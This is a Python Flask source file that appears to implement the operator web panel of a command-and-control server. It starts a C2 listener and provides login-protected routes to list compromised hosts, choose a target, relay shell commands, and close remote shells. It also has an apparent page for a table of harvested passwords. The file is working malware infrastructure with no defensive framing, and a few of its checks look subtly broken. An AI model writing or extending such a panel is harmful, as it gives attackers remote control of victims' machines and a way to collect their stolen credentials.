from flask import *
import os
from Socket.Server import Server
from .FlskServerTools.user import User
from .FlskServerTools.Dbactions import LoginDB
from flask_login import *
from secrets import token_urlsafe
from Tools.toolsF import getJsonKey


class FlskSevrev(object):
    
    def __init__(self,C2Private,C2Port=555):
        self.app = Flask(
            __name__, 
            static_folder=os.path.join(os.getcwd(),'FlaskAplication','test','templates','static')
        )
        self.app.config['SECRET_KEY'] = token_urlsafe(40)
        self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
        self.dbaction = LoginDB(os.path.join(os.getcwd(),'FlaskAplication','test','SQL','Login.db'))
        self.c2Server.start()
        self._ruleResetor()
        self.login_manager = LoginManager()
        self.login_manager.init_app(self.app)
        self.login_manager.login_view = 'loginPage'
        self.login_manager.user_loader(self.load_user)


    def load_user(self, user_id):
        if self.dbaction.user_exists(user_id):
            return User(user_id)
        return None

    def loginPage(self):
        if current_user.is_authenticated:
            return redirect(url_for('homePage'))
        return render_template("Login.html")
    
    def logout(self):
        logout_user()
        return redirect(url_for('loginPage'))
    
    def _valid_token(self,token):
        return token in self.c2Server.connections.keys


    def signUp(self):
        data = request.get_json()
        username = getJsonKey(dct=data,key='username',default='')
        password = getJsonKey(dct=data,key='password',default='')
        if not self.dbaction.insert_user(username, password):
            return jsonify({"message": "Sign Up successful"})
        return jsonify({"message": "Something went wrong while processing your request"}), 401
    
    def login(self):
        if request.method == 'POST':
            data = request.get_json()
            username = data['username']
            password = data['password']
            if self.dbaction.authenticate_user(username, password):
                user = User(username)
                login_user(user)
                return jsonify({"message": "Login successful"})
            else:
                return jsonify({"message": "Invalid username or password"}), 401
        return self.loginPage()
    

    def getshellChat(self,id):
        if self.c2Server.connections.isconnected(id):
            return render_template('ChatBox.html',hostname=id)
        return make_response("Page not found", 404)
    

    def shellPage(self):
        return render_template('ChatBox.html')
 
    
    def choseTarget(self):
        data = request.get_json()
        self.c2Server.connections.connctTo = data['id']
        return {'Status': 'Completed'}

    def listConnections(self):
        return self.c2Server.connections.connections
    
    
    def homePage(self):
        return render_template('Index.html')
    
   
    def send_message(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['id'])
        msg = connObj.commandManager.retriveCommand(data['message'])
        return {'message': msg}
    
   
    def closeShell(self):
        data = request.get_json()
        self.c2Server.connections.disconnect(data['id'])
        return {'Status':"Disconnect"}
    
    
    def listShellConnections(self):
        return self.c2Server.connections.getShellConntions()
    
    
    def passwordsTableIndex(self):
        return render_template("passwordTable.html")


    def _ruleResetor(self):
        self.app.add_url_rule('/', 'loginPage', self.loginPage)
        self.app.add_url_rule('/login', 'login', self.login ,methods=['GET', 'POST'])
        self.app.add_url_rule('/logout', 'logout', self.logout)
        self.app.add_url_rule('/home', 'homePage', login_required(self.homePage))
        self.app.add_url_rule('/listConnections', 'listConnections', login_required(self.listConnections))
        self.app.add_url_rule('/shellPage', 'shellPage', login_required(self.shellPage))
        self.app.add_url_rule('/send_message', 'send_message', login_required(self.send_message), methods=['POST'])
        self.app.add_url_rule('/closeShell', 'closeShell', login_required(self.closeShell), methods=['POST'])
        self.app.add_url_rule('/choseTarget', 'choseTarget', login_required(self.choseTarget), methods=['POST'])
        self.app.add_url_rule('/listShellConnections', 'listShellConnections', login_required(self.listShellConnections))
        self.app.add_url_rule('/passwordsTableIndex', 'passwordsTableIndex', self.passwordsTableIndex)